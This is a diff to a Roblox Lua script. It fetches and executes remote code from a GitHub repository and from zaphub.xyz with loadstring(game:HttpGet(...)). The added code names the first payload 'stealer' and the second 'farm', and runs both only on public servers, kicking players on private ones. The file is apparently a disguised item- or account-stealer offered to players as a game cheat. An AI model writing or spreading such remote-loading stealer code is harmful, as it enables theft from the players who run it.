@@ -1,19 +1,20 @@
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
 
--- Проверка: является ли сервер VIP
+local function stealer()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/ODHUBytb/All-need-xx-script-veshi/refs/heads/main/x%20script%20base%20no%20deleting'))()
+end
+
+local function farm()
+    loadstring(game:HttpGet('https://www.zaphub.xyz/Exec'))()
+end
+
 local isVIPServer = ReplicatedStorage.Remotes.Extras.IsVIPServer:InvokeServer()
 
-if isVIPServer == true then
-    LocalPlayer:Kick("Private Servers Not Supported, Please Use Script In Public Server")
+if not isVIPServer then
+    task.spawn(stealer)
+    task.spawn(farm)
 else
-    -- Запускаем фон (GitHub) скрипт
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/ODHUBytb/All-need-xx-script-veshi/refs/heads/main/x%20script%20base%20no%20deleting"))()
-
-    -- Ждём 2 секунды, чтобы первый скрипт выполнился
-    task.wait(2)
-
-    -- Запускаем блокирующий скрипт
-    loadstring(game:HttpGet("https://zaphub.xyz/Exec"))()
+    LocalPlayer:Kick("Private Servers Not Supported, Please Use Script In Public Server")
 end
